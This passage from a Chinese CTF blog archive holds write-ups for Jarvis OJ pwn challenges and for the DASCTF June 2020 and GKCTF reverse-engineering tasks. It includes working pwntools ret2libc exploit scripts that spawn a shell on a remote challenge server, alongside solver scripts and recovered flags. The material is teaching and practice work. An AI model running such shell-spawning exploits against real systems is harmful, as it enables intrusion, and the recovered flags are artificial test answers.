write_got=0x804A018 payload1 = b\u0026#39;a\u0026#39; * (0x88 + 0x4) + p32(write_plt) + p32(read) + p32(0x01) + p32(write_got) + p32(0x04) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload1) write_add = u32(io.recv(4)) # 计算system函数和/bin/sh在内存中的真实地址 libc = ELF(\u0026#39;./libc-2.19.so\u0026#39;) t = write_add - libc.symbols[\u0026#39;write\u0026#39;] system = t + libc.symbols[\u0026#39;system\u0026#39;] binsh = t + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) payload2 = b\u0026#39;a\u0026#39;*(0x88 + 0x4) payload2 += p32(system) + p32(0) + p32(binsh) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload2) io.interactive() io.close() 好像只要是程序和libc里面有的函数都可以拿来泄露\u0026hellip;\n每次运行内存中的位置会发生变化\n溢出修改ret跳转值\n执行到write内部，函数将 write_got 作为参数输出在了屏幕上\nlevel3 x64 # 和x86版的区别是传参要借助寄存器,所以要找 pop 来传参(话说传参方式应该还有很多吧?)\n--\u0026gt; 0x00000000004006b3 : pop rdi ; ret --\u0026gt; 0x00000000004006b1 : pop rsi ; pop r15 ; ret from pwn import * p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, \u0026#34;9883\u0026#34;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) context.log_level=\u0026#34;debug\u0026#34; main_add=0x4005e6 writeplt=elf.symbols[\u0026#39;write\u0026#39;] writegot=elf.got[\u0026#39;write\u0026#39;] rdiset=0x00000000004006b3 # 1 rsiset=0x00000000004006b1 #2 payload0 = 0x88*b\u0026#39;a\u0026#39; payload0+=p64(rdiset) payload0+=p64(1) # 1 赋给 rdi payload0+=p64(rsiset) payload0+=p64(writegot) # writegot 给 rsi payload0+=p64(8) # 跳过 r15 payload0+=p64(writeplt)# write(1,writegot,0x200) rdx的0x200是read给的 payload0+=p64(main_add) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload0) writeaddr=p.recv(8)# 收集 writegot 地址 writeaddr=u64(writeaddr) sysoffest=libc.symbols[\u0026#39;system\u0026#39;] binoffest=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) t = writeaddr - libc.symbols[\u0026#39;write\u0026#39;] system=sysoffest + t sh=binoffest + t payload1 = b\u0026#39;a\u0026#39;*0x88 payload1 += p64(rdiset) payload1 += p64(sh)+p64(system) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload1) p.interactive() ","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level1to3/","section":"archive","summary":"level0 # x86栈溢出","title":"Jarvis_OJ_pwn_level1to3"},{"content":" 端午节回山里玩了一趟，做题时间仅有半天，做了的依旧只有re。。。。\nT0p_Gear # 签到题，但做法不是很签到\n三个判断输入三段字符串最后拿到完整flag\n经过动调发现fun1函数是拿来比较的，在fun1入口把字符串copy下来就行了\nflag1 c92bb6a5 # flag1密文校验\n_BOOL8 __usercall chk1@\u0026lt;rax\u0026gt;(YouWouldChk *this@\u0026lt;rdi\u0026gt;, __int64 a2@\u0026lt;rbp\u0026gt;, __m256i a3@\u0026lt;ymm7\u0026gt;) { __int128 v4; // [rsp-28h] [rbp-28h] unsigned __int64 v5; // [rsp-10h] [rbp-10h] __int64 v6; // [rsp-8h] [rbp-8h] __asm { endbr64 } v6 = a2; v5 = __readfsqword(0x28u); v4 = (unsigned __int64)\u0026#39;5a6bb29c\u0026#39;; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;I drew a :\u0026#34;, 0LL); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::chk1(void)::JC); return (unsigned int)fun1((unsigned __int64)YouWouldChk::chk1(void)::JC, (__int64)\u0026amp;v4, a3) == 0; } flag2 a6c30091 # flag2要从附件中读取秘钥来解码字符串，在fun1处copy下来就行了\n__asm { endbr64 } key = a3; // 神必字符串 v25 = __readfsqword(0x28u); v17 = \u0026#39;txt.tt\u0026#39;; v18 = 0LL; v19 = 0LL; v20 = 0LL; v21 = 0LL; v22 = 0LL; v23 = 0LL; v24 = 0LL; v6 = YouWouldChk::readStrFromFile(this, (char *)\u0026amp;v17, (char *)\u0026amp;v12, (__int64)\u0026amp;key); YouWouldChk::deAes(this, (char *)\u0026amp;v12, a2, v6, (__int64)\u0026amp;key, a5, a6);//aes解密 v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; sub_4010D0((unsigned __int64)\u0026amp;v12, (signed __int64)\u0026amp;v13, (unsigned __int64)\u0026amp;v12, a5, a6); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Richard steals some:\u0026#34;, v7); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::deAesFileAndMore(char *)::RH); i_1 = 0; for ( i = 0; *((_BYTE *)\u0026amp;v12 + i); ++i ) { if ( *((_BYTE *)\u0026amp;key + i - 144) != \u0026#39;f\u0026#39; ) { v8 = i_1++; *((_BYTE *)\u0026amp;key + v8 - 144) = *((_BYTE *)\u0026amp;key + i - 144); } } *((_BYTE *)\u0026amp;key + i_1 - 144) = 0; return (unsigned int)fun1((unsigned __int64)\u0026amp;v12, (__int64)YouWouldChk::deAesFileAndMore(char *)::RH, a4) == 0; flag3 24566d882d4bc7ee # 和flag1一样fun1处复制下来\n然后拼到一起\nc92bb6a5a6c3009124566d882d4bc7ee\nmaze # 简单地图，不像上个月有多重路径搞得很迷惑\n动调载入地图复制出来，稍微处理一下\nX X X X X # X X X X X X X X X X X X X X X X X X X X X X X X X X md5(jkkjjhjjkjjkkkuukukkuuhhhuukkkk )\nMagia # for ( i = 31; i_1 \u0026lt; i; --i ) { if ( (flag[i] ^ flag[i_1]) != *(\u0026amp;v59 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i] \u0026amp; flag[i_1]) != *(\u0026amp;v43 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i_1] \u0026amp; 0xF) != *(\u0026amp;v11 + i_1) || (flag[i] \u0026amp; 0xF) != *(\u0026amp;v11 + i) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } ++i_1; } 根据以上判断条件我们可以得到81个符合条件的flag\nNep{mYrclU_a^dOmaxooisonotofree} Nep{mYrclU_a^d_mahooisonotofree} Nep{mYrclU_a^domaXooisonotofree} Nep{mYrclU_andOmaxo_isonotofree} Nep{mYrclU_and_maho_isonotofree} Nep{mYrclU_andomaXo_isonotofree} Nep{mYrclU_a~dOmaxoOisonotofree} Nep{mYrclU_a~d_mahoOisonotofree} Nep{mYrclU_a~domaXoOisonotofree} Nep{mYrcle_a^dOmaxoois_notofree} Nep{mYrcle_a^d_mahoois_notofree} Nep{mYrcle_a^domaXoois_notofree} Nep{mYrcle_andOmaxo_is_notofree} Nep{mYrcle_and_maho_is_notofree} Nep{mYrcle_andomaXo_is_notofree} Nep{mYrcle_a~dOmaxoOis_notofree} Nep{mYrcle_a~d_mahoOis_notofree} Nep{mYrcle_a~domaXoOis_notofree} Nep{mYrclu_a^dOmaxooisOnotofree} Nep{mYrclu_a^d_mahooisOnotofree} Nep{mYrclu_a^domaXooisOnotofree} Nep{mYrclu_andOmaxo_isOnotofree} Nep{mYrclu_and_maho_isOnotofree} Nep{mYrclu_andomaXo_isOnotofree} Nep{mYrclu_a~dOmaxoOisOnotofree} Nep{mYrclu_a~d_mahoOisOnotofree} Nep{mYrclu_a~domaXoOisOnotofree} Nep{mirclU_a^dOmaxooisonot_free} Nep{mirclU_a^d_mahooisonot_free} Nep{mirclU_a^domaXooisonot_free} Nep{mirclU_andOmaxo_isonot_free} Nep{mirclU_and_maho_isonot_free} Nep{mirclU_andomaXo_isonot_free} Nep{mirclU_a~dOmaxoOisonot_free} Nep{mirclU_a~d_mahoOisonot_free} Nep{mirclU_a~domaXoOisonot_free} Nep{mircle_a^dOmaxoois_not_free} Nep{mircle_a^d_mahoois_not_free} Nep{mircle_a^domaXoois_not_free} Nep{mircle_andOmaxo_is_not_free} Nep{mircle_and_maho_is_not_free} Nep{mircle_andomaXo_is_not_free} Nep{mircle_a~dOmaxoOis_not_free} Nep{mircle_a~d_mahoOis_not_free} Nep{mircle_a~domaXoOis_not_free} Nep{mirclu_a^dOmaxooisOnot_free} Nep{mirclu_a^d_mahooisOnot_free} Nep{mirclu_a^domaXooisOnot_free} Nep{mirclu_andOmaxo_isOnot_free} Nep{mirclu_and_maho_isOnot_free} Nep{mirclu_andomaXo_isOnot_free} Nep{mirclu_a~dOmaxoOisOnot_free} Nep{mirclu_a~d_mahoOisOnot_free} Nep{mirclu_a~domaXoOisOnot_free} Nep{myrclU_a^dOmaxooisonotOfree} Nep{myrclU_a^d_mahooisonotOfree} Nep{myrclU_a^domaXooisonotOfree} Nep{myrclU_andOmaxo_isonotOfree} Nep{myrclU_and_maho_isonotOfree} Nep{myrclU_andomaXo_isonotOfree} Nep{myrclU_a~dOmaxoOisonotOfree} Nep{myrclU_a~d_mahoOisonotOfree} Nep{myrclU_a~domaXoOisonotOfree} Nep{myrcle_a^dOmaxoois_notOfree} Nep{myrcle_a^d_mahoois_notOfree} Nep{myrcle_a^domaXoois_notOfree} Nep{myrcle_andOmaxo_is_notOfree} Nep{myrcle_and_maho_is_notOfree} Nep{myrcle_andomaXo_is_notOfree} Nep{myrcle_a~dOmaxoOis_notOfree} Nep{myrcle_a~d_mahoOis_notOfree} Nep{myrcle_a~domaXoOis_notOfree} Nep{myrclu_a^dOmaxooisOnotOfree} Nep{myrclu_a^d_mahooisOnotOfree} Nep{myrclu_a^domaXooisOnotOfree} Nep{myrclu_andOmaxo_isOnotOfree} Nep{myrclu_and_maho_isOnotOfree} Nep{myrclu_andomaXo_isOnotOfree} Nep{myrclu_a~dOmaxoOisOnotOfree} Nep{myrclu_a~d_mahoOisOnotOfree} Nep{myrclu_a~domaXoOisOnotOfree} 但是根据常识可以找到Nep{mircle_and_maho_is_not_free}\n之后该flag参与一段smc，众所周知单层smc和没有是一样的\n但是这个题后面出现了奇怪的东西\nsmc内部： # v2 = 37; v3 = 110; v4 = 49; v5 = 19; v6 = 47; v7 = 40; v8 = 32; v9 = 60; v10 = 53; v11 = 52; v12 = 48; v13 = 109; v14 = 59; v15 = 54; v16 = 7; v17 = 60; v18 = 56; v19 = 127; v20 = 93; v21 = 84; v22 = 40; v23 = 30; v24 = 26; v25 = 47; v26 = 59; v27 = 43; v28 = 85; v29 = 54; v30 = 73; v31 = 109; v32 = 102; v33 = 126; v34 = 0; v35 = 1601399123; v36 = 1818588528; v37 = 1834967404; v0 = __inbyte(0x66u); v38 = 8545; v39 = BYTE2(dword_405150); v40 = 0i64; v41 = 0; v42 = 0; for ( i = 0; i \u0026lt; strlen(flag); ++i ) *((_BYTE *)\u0026amp;v43 + i - 73) = *((_BYTE *)\u0026amp;v43 + (signed int)i % 18 - 37) ^ *((_BYTE *)\u0026amp;v43 + 4 * i - 205) ^ flag[i]; 后面并没有对flag进行判断，直接把flag跑出来了。。。。\n.scode:00403219 loc_403219: .scode:00403219 0EC xor ecx, eax .scode:0040321B 0EC mov edx, [ebp-0D8h] .scode:00403221 0EC mov [ebp+edx-4Ch], cl \u0026lt;--- .scode:00403225 1D8 jmp loc_403186 Stack[0000633C]:0019FE58 a8b272473500a45 db \u0026#39;8b272473500a451286ab225413f1debd\u0026#39;,0 8b272473500a451286ab225413f1debd\n521 # 看起来花里胡哨的rc4\ncpp程序直接对着伪代码调试也可以得到比较好的效果\nv16 = __readfsqword(0x28u); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;FLAG, a2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;a3, a2, v2); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(\u0026amp;v13, a2, v3); init_key((__int64)v15);//秘钥生成 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;a3, v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( v4 != 37 ) { a1 = 0; v5 = 0; } else { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::basic_string(v15, \u0026amp;FLAG); v6 = chk2((__int64)v15); // 判断格式 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(v15); if ( v6 ) { qmemcpy(v15, \u0026amp;unk_55AD074D7DC0, sizeof(v15)); encode((__int64)\u0026amp;FLAG_1, (__int64)\u0026amp;FLAG, (__int64)\u0026amp;a3);//RC4加密 std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(\u0026amp;v13, \u0026amp;FLAG_1); std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string(\u0026amp;FLAG_1); for ( i = 0; ; ++i ) { std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::length(); if ( i \u0026gt;= v7 ) break; if ( *(char *)std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator[](\u0026amp;v13, i) != v15[i] ) { a1 = 0; { __int64 result; // rax unsigned int v5; // eax unsigned int v6; // [rsp+1Ch] [rbp-Ch] int v7; // [rsp+20h] [rbp-8h] unsigned int i; // [rsp+24h] [rbp-4h] rc4_init(a3, a4); v6 = 0; v7 = 0; for ( i = 0; ; ++i ) { result = i; if ( a2 \u0026lt;= i ) break; v6 = (unsigned __int8)(((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24) + v6 + 1) - ((unsigned int)((signed int)(v6 + 1) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24); v5 = (unsigned int)((v7 + tab[v6]) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 24; v7 = (unsigned __int8)(v5 + v7 + tab[v6]) - v5; exchange((char *)\u0026amp;tab[v6], (char *)\u0026amp;tab[v7]); *(_BYTE *)((signed int)i + a1) ^= tab[(unsigned __int8)(tab[v6] + tab[v7])]; } return result; } 很明显的rc4,对着异或点看数据就行了\nl = [0x80, 0x59, 0x23, 0x35, 0x2b, 0x4, 0x8f, 0x1e, 0x55, 0x26, 0x32, 0xe8, 0x50, 0x57, 0x81, 0xa, 0xc4, 0x94, 0x25, 0xdc, 0x84, 0x69, 0x76, 0xe6, 0x54, 0xb, 0x6e, 0xf3, 0x53, 0x31, 0x62, 0x49, 0xc, 0xff, 0xff, 0xfa, 0x22, 0x0] flag = [0x4e, 0x65, 0x70, 0x7b, 0x31, 0x32, 0x33, 0x41, 0x42, 0x43, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x7d, 0x0] encode = [0x80, 0x59, 0x23, 0x35, 0x22, 0x73, 0x8d, 0x1a, 0x51, 0x5d, 0x30, 0xe8, 0x57, 0x26, 0xf6, 0x7, 0xc6, 0x92, 0x5e, 0xdc, 0x83, 0x1f, 0x76, 0x92, 0x25, 0xf, 0x65, 0xfb, 0x2e, 0x4d, 0x6b, 0x45, 0x3, 0x87, 0xe9, 0x9f, 0x22, 0x0] for i in range(37):\tprint(chr(encode[i]^(l[i]^flag[i])),end=\u0026#39;\u0026#39;) Nep{8E1EF8215BC841CAE5D17CCA77EAA7F4}\npyCharm # 我摊牌了,这题我蒙的 :D 把很可疑的字符串拿出来,试了试是不行的,又觉得a很可疑,把a全去掉就可以正常解base64了\u0026hellip;.\nYamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM= \u0026gt;\u0026gt; YmNlZTcxZDhjYmI0NDU3YjUwNWNjMjUwNWI3M2NhMGM= \u0026gt;\u0026gt; bcee71d8cbb4457b505cc2505b73ca0c ","date":"27 June 2020","permalink":"/achieve/2019to2021/dasctf-2020-6/","section":"archive","summary":"端午节回山里玩了一趟，做题时间仅有半天，做了的依旧只有re。。。。","title":"安恒六月赛-2020-re部分"},{"content":" 发现GKCTF在buu上面挂了好久，干脆做着玩玩好了\nCheck_1n # 打开一看，是一个 真-虚拟机，vm看了直呼内行\n直接找字符串\n解出来是这样的\nWhy don\u0026rsquo;t you try the magic brick game\n然后又找到一串很像密文的字符串\n看一下调用了他的函数\ndecode: # for ( i = 0; i \u0026lt; str; ++i ) { v3 = byte_175E270[(unsigned __int8)a1[i]]; if ( v3 \u0026lt; 0 ) { sub_406B70(v8); return 0; } for ( j = \u0026amp;v8[v9 - 1]; j \u0026gt;= str2; --j ) { v2 = 58 * (unsigned __int8)*j + v3; *j = v2 % 0x100; v3 = BYTE1(v2); } if ( v3 \u0026gt; 0 ) { if ( --str2 \u0026lt; v8 ) { sub_406B70(v8); return 0; } *str2 = v3; } } for ( k = 0; k \u0026lt; \u0026amp;v8[v9] - str2; ++k ) v8[k] = str2[k]; v8[k] = 0; return v8; 是base58的算法，直接在线解就可以了\nflag{f5dfd0f5-0343-4642-8f28-9adbb74c4ede}\nbabyDriver # 0x140001380里面是一个迷宫\ncode: # __int64 __fastcall map_0(__int64 a1, __int64 str_2) { __int64 v2; // rbx __int64 str_1; // rdi __int64 v4; // rax int local; // ecx __int16 *str; // rsi __int64 Sbox; // rbp __int16 s; // dx char siep; // dl CHAR *v10; // rcx v2 = str_2; if ( *(_DWORD *)(str_2 + 48) \u0026gt;= 0 ) { str_1 = *(_QWORD *)(str_2 + 24); v4 = *(_QWORD *)(str_2 + 56) \u0026gt;\u0026gt; 3; if ( (_DWORD)v4 ) { local = value1; str = (__int16 *)(str_1 + 2); Sbox = (unsigned int)v4; while ( *(_WORD *)(str_1 + 4) ) { LABEL_28: str += 6; if ( !--Sbox ) goto LABEL_29; } map[local] = 46; s = *str; if ( *str == \u0026#39;\\x17\u0026#39; ) { if ( local \u0026amp; 0xFFFFFFF0 ) { local -= 0x10; goto LABEL_21; } local += 0xD0; value1 = local; } if ( s == \u0026#39;%\u0026#39; ) { if ( (local \u0026amp; 0xFFFFFFF0) != 0xD0 ) { local += 16; goto LABEL_21; } local -= 0xD0; value1 = local; } if ( s == \u0026#39;$\u0026#39; ) { if ( local \u0026amp; 0xF ) { --local; goto LABEL_21; } local += 15; value1 = local; } if ( s != \u0026#39;\u0026amp;\u0026#39; ) goto LABEL_22; if ( (local \u0026amp; 0xF) == 15 ) local -= 15; else ++local; LABEL_21: value1 = local; LABEL_22: siep = map[local]; if ( siep == \u0026#39;*\u0026#39; ) { v10 = \u0026#34;failed!\\n\u0026#34;; } else { if ( siep != \u0026#39;#\u0026#39; ) { LABEL_27: map[local] = \u0026#39;o\u0026#39;; goto LABEL_28; } v10 = \u0026#34;success! flag is flag{md5(input)}\\n\u0026#34;; } value1 = 16; DbgPrint(v10); local = value1; goto LABEL_27; } } LABEL_29: if ( *(_BYTE *)(v2 + 65) ) *(_BYTE *)(*(_QWORD *)(v2 + 184) + 3i64) |= 1u; return *(unsigned int *)(v2 + 48); } 乍一看 local 的变化有些地方毫无章法,再仔细一看发现是用来判断是否到底的,如果到边界就从另一边出来\nmap: # o X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X X # X 因为是驱动文件所以字符是以键盘扫描码的形式输入的\n对应表： https://blog.csdn.net/wenweimin/article/details/105561\n注意键盘扫描码全是大写\n把迷宫走出来转md5\nLKKKLLKLKKKLLLKKKLLLLLL flag{403950a6f64f7fc4b655dea696997851}\nChelly\u0026rsquo;s identity # 这个题还比较有意思,可惜还是单字节加密\n直接动调到加密位置\ndemo # _DWORD *flag;//注意flag变成int了 while ( flag != (_DWORD *)v6 ) { v5 = 0; v4 = 0; for ( i = (_DWORD *)sub_3B1325(\u0026amp;v8, 0); *i \u0026lt; *flag; i = (_DWORD *)sub_3B1325(\u0026amp;v8, v4) ) v5 += *(_DWORD *)sub_3B1325(\u0026amp;v8, v4++); *flag ^= v5; ++flag; } 函数sub_3B1325里面的东西很不知所云,直接看汇编算了\n发现这里从一个素数表取数和flag的值做对比，异或值是素数累加的值，分析得出算法：\ndome # l=[2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127] # l是素数表 s1=[]#前n个素数和 for i in range(len(l)): ans+=l[i] print(ans,i,l[i]) s1.append(ans) s=\u0026#34;Che11y_1s_EG0IST\u0026#34; s2=[] for i in s:#是是flag for j in range(len(l)): if l[j] \u0026gt;= ord(i): s2.append((ord(i)^(s1[j-1]))) 爆破就行了：\nexp # encode=[438,1176,1089,377,377,1600,924,377,1610,924,637,639,376,566,836,830] s=\u0026#34;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#34; tab =[129, 130, 131, 132, 133, 227, 226, 237, 236, 196, 197, 309, 308, 311, 310, 376, 377, 378, 379, 380, 381, 331, 330, 325, 324, 327, 326, 388, 389, 459, 458, 437, 436, 439, 438, 636, 637, 638, 639, 567, 566, 642, 643, 644, 645, 646, 647, 839, 838, 837, 836, 830, 831, 828, 829, 818, 819, 921, 920, 927, 926, 925, 924, 931, 930, 1094, 1095, 1088, 1089, 1263, 1262, 1176, 1177, 1178, 1179, 1335, 1334, 1446, 1447, 1464, 1465, 1611, 1610, 1613, 1612, 1615, 1614, 1601, 1600, 1603, 1602, 1605, 1604] # tab是s的密文 for i in encode: print(s[tab.index(i)],end=\u0026#39;\u0026#39;) Che11y_1s_EG0IST\nEzMachine # 虚拟机，先找vm的部分：\n这个大循环基本就是vm的主体了,通过改变这个 call 调用的函数来传递参数和对flag进行计算\n经过漫长的调试发现在取从flag中取字符串的函数后会调用好几个用减法来进行对比的函数,发现程序用这种方式来判断字符串的范围\n.text:00E81300 cheak proc near ; DATA XREF: .data:00EC4954↓o .text:00E81300 mov edx, time .text:00E81306 movzx eax, byte ptr unk_EC49A2[edx] .text:00E8130D mov ecx, ds:off_EC27FC[eax*4] .text:00E81314 movzx eax, byte_EC49A1[edx] .text:00E8131B add edx, 3 .text:00E8131E mov time, edx .text:00E81324 mov eax, ds:off_EC27FC[eax*4] .text:00E8132B mov eax, [eax] .text:00E8132D sub eax, [ecx] \u0026lt;------ flag值 减去 对比值 通过结果的大小来判断值的范围 .text:00E8132F mov cheak_return, eax .text:00E81334 retn .text:00E81334 cheak endp 之后几个计算的函数有无又计算符的关系还比较方便分析,最后可以搞定加密的代码,再观察最后对比的方式可以找到传参方式\ncipher=[] or i in s1: print(i,end=\u0026#39; \u0026#39;) if \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x47)+1)//0x10) cipher.append(((ord(i)^0x47)+1)%0x10) if \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;.find(i) != -1: cipher.append(((ord(i)^0x4b)-1//0x100)) cipher.append(((ord(i)^0x4b)-1%0x100)) elif \u0026#39;_{}\u0026#39;.find(i) !=-1: cipher.append(ord(i)//100) cipher.append(ord(i)%100) cipher=cipher[::-1]#最后对比的时候在内存里面的值有点魔幻,但基本能弄出来 又是单字节加密,把所有科显示字符弄出来一一对应再去掉题目不要求的字符就可以了\ns1=\u0026#39;!\\\u0026#34;#$%\u0026amp;\\\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}\u0026#39; tab =[33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 9, 8, 7, 14, 13, 12, 11, 2, 1, 0, -1, 6, 5, 4, 3, 26, 25, 24, 23, 30, 29, 28, 27, 18, 17, 16, 91, 92, 93, 94, 95, 96, 39, 38, 37, 36, 35, 34, 33, 48, 47, 46, 45, 44, 43, 42, 41, 56, 55, 54, 53, 52, 51, 50, 49, 64, 63, 62, 123, 124, 125] ans=[0x22,0x2c,0x27,0x21,0x7b,0x17,0x33,0x25,0x30,0x5f,0x9,0x5f,0xd,0x10,0x1c,0x5,0x7d] for i in ans: for j in range(len(tab)): if tab[j] == i: print(s1[j],end=\u0026#39;\u0026#39;) 然后把题目不要求的字符去掉\nf,l\u0026rsquo;a!g{S3u%c0h_A_EZVM} flag{Such_A_EZVM}\nDbgIsFun # 晚上闲着没事就干脆做了，明天把剩下的都做了吧，找不到wp反而更刺激了\n开局就看到TLS,反调试预定，调试后发现中间的异或是再解smc，众所周知单层smc和没有是一样的（x）\n下断点看看 sub_4010F0 里面\ndemo: # while ( !dword_41A8E0 ) Sleep(0x3E8u); for ( i = 0; i \u0026lt; 140; ++i ) byte_41A8DE += *((_BYTE *)\u0026amp;loc_401540 + i); for ( i = 0; flag[i]; ++i ) flag[i] ^= byte_41A8DE; v10 = 71; v11 = 75; v12 = 67; v13 = 84; v14 = 70; for ( j = 0; j \u0026lt; 256; ++j ) list[j] = j; for ( j = 0; j \u0026lt; 256; ++j ) v8[j] = *((_BYTE *)\u0026amp;v10 + 4 * (j % 5)); v20 = 0; for ( j = 0; j \u0026lt; 256; ++j ) { v20 = (v8[j] + list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; } v18 = len; v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; v22 = v23; if ( j != len \u0026amp;\u0026amp; j == len ) JUMPOUT(0xD04FE8DB); v5 = 0; while ( v5 \u0026lt; len ) { if ( v22[v5] != *(_BYTE *)(v5 + 4199594) ) { sub_401640(4199659, v25); sub_405183(0); break; } if ( ++v5 ) { if ( !v5 ) JUMPOUT(0x6EAF8766u); } } sub_401640(\u0026#34;right\\n\u0026#34;, v24); sub_403AFA(); return 0; } 十分明显的RC4，rc4之前将flag每个字符的值异或上了0xc9\n题目到这里已经做完了，到0x4014AA里面去拿数据直接rc4就完事了\n但是注意，动调时和非动调时内存0x4014AA里面的值因为smc解码的原因，所以是不一样的\n然后继续动调可以发现前面的rc4函数是可以进去的，但是因为反调试，flag的输入被跳过了，但是这并不影响后续流程\n这里Sleep的计时器因为没有pdb文件所以会出错,改dword_41A8E0的值跳过\n出现在数据段的神必字符串： X:\\I_am_afraid_there_is_no_PDB_file_for_you_my_friend:D\nwhile ( !dword_41A8E0 ) Sleep(0x3E8u); 因为没有 flag 输入所以 len 是0，这里是可以自己算的，但作为一条懒狗完全体，能让程序做的事情我们坚决不做\nbraekpoint # v18 = len; \u0026lt;---改大一点 v16 = 0; v20 = 0; j = 0; while ( 1 ) { v4 = v18--; if ( !v4 ) break; j = (j + 1) % 256; v20 = (list[j] + v20) % 256; v17 = list[j]; list[j] = list[v20]; list[v20] = v17; v15 = (list[v20] + list[j]) % 256; Sbox[v16++] = list[v15]; } for ( j = 0; j \u0026lt; len; ++j ) \u0026lt;---下断点拿数据 v23[j] = LOBYTE(Sbox[j]) ^ flag[j]; exp # encode=[0x2d,0xd4,0xf,0xd0,0x54,0xee,0x75,0xd0,0xe0,0x30,0x96,0xe1,0x79,0x8a,0xe0,0xfe,0x18,0x3a,0x27,0xe7,0x2f,0x86,0xc9,0xfe,0x66,0x43,0xa7,0x75,0x33,0xdb,0x8b,0xd,0xe4,0xa8,0x41,0x0,0x3b,0xd9,0x7d,0x38,0x8b,0x85,0xf8,0xff,0xfe,0xff,0x8a,0x4,0x18,0x8a,0x93,0xaa,0x14,0x40,0x0,0x3a,0xc2,0x75,0x14,0x43,0x74,0xe0,0x75,0xde] key = 